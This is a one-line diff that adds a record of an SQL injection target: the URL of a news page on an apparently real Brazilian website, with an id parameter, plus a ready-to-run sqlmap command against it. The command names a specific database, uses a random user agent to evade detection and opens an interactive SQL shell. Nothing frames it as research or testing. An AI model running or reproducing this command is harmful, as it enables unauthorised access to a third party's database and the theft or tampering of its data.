@@ -1,0 +1,1 @@
+http://www.casimper.com.br/noticias.php?id=2 (GET)  # sqlmap.py -u http://www.casimper.com.br/noticias.php?id=2 -D casimper1 --threads 5 -v3 --random-agent --sql-shell
